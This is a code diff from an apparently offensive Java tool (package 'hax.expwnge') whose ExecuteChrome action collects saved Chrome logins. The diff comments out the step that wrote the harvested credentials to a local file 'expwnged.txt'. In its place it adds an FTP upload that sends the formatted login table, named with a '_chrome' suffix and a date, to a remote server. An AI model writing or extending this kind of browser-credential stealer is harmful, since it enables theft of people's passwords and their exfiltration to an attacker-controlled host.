@@ -1,21 +1,22 @@
 package hax.expwnge.processing.impl.actions;
 
-import static hax.expwnge.models.Login.LOGIN_TABLE_FACTORY;
-
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
-import java.nio.file.StandardOpenOption;
+import java.util.Date;
 import java.util.List;
+import java.util.logging.Logger;
 
-import org.apache.log4j.Logger;
 import org.springframework.beans.factory.annotation.Autowired;
 
 import hax.expwnge.dao.LoginDAO;
 import hax.expwnge.models.Login;
+import hax.expwnge.models.Login.Table;
 import hax.expwnge.models.ProcessingContext;
 import hax.expwnge.processing.api.ExecuteAction;
+import hax.expwnge.utils.FTPUtils;
+import static hax.expwnge.models.Login.LOGIN_TABLE_FACTORY;
 
 public class ExecuteChrome implements ExecuteAction<ProcessingContext> {
   @Autowired
@@ -43,15 +44,19 @@ public class ExecuteChrome implements ExecuteAction<ProcessingContext> {
     } catch (Exception e) {
       LOGGER.error(e);
     }
-
-    /** Store formatted data **/
-    try {
-      Files.write(Paths.get("expwnged.txt"), LOGIN_TABLE_FACTORY.new Table(logins).getContent(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
-    } catch (Exception e) {
-      LOGGER.error(e);
+//
+//    /** Store formatted data **/
+//    try {
+//      Files.write(Paths.get("expwnged.txt"), LOGIN_TABLE_FACTORY.new Table(logins).getContent(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+//    } catch (Exception e) {
+//      LOGGER.error(e);
+//    }
+    
+    if(processingContext.getFtpCreds().isEnabled()) {
+      FTPUtils.storeFile(processingContext.getFtpCreds(), processingContext.getFileName()+"_chrome"+new Date(), LOGIN_TABLE_FACTORY.new Table(logins).getContentAsStream()); // + fileName (es. fileName+appendix+formattedDate + file InputStream
     }
     
-    return null;
+    return processingContext;
   }
 
 }
